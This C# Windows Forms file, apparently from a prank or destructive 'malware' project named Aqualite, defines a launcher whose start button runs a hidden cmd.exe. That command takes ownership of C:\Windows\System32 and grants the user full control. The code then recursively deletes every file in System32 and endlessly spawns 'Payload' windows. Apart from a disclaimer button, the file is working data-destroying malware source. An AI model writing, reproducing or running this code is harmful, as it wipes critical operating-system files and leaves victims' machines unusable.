using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.AccessControl;
using System.Diagnostics;

namespace Aqualite
{
    public partial class Launcher : Form
    {
        public Launcher()
        {
            InitializeComponent();
        }

        private void startClick(object sender, EventArgs e)
        {
            Process process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = @"/k takeown /f C:\Windows\System32\ /A /R /D Y && icacls C:\Windows\System32\ /grant %username%:F";
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();

            EmptyFolder(new DirectoryInfo(@"C:\\Windows\\System32"));


             // dont forget to use this header

            //Method to delete all files in the folder and subfolders

            void EmptyFolder(DirectoryInfo directoryInfo)
            {
                foreach (FileInfo file in directoryInfo.GetFiles())
                {
                    file.Delete();
                }

                foreach (DirectoryInfo subfolder in directoryInfo.GetDirectories())
                {
                    EmptyFolder(subfolder);
                }
            }
            while (true)
            {
                Payload form = new Payload();
                form.Show();
            }

        }

        private void Launcher_Load(object sender, EventArgs e)
        {

        }

        private void Title_Click(object sender, EventArgs e)
        {
           
        }

        private void DISCLAIMER_Click(object sender, EventArgs e)
        {
            Disclaimer form = new Disclaimer();
            form.Show();
        }
    }
}
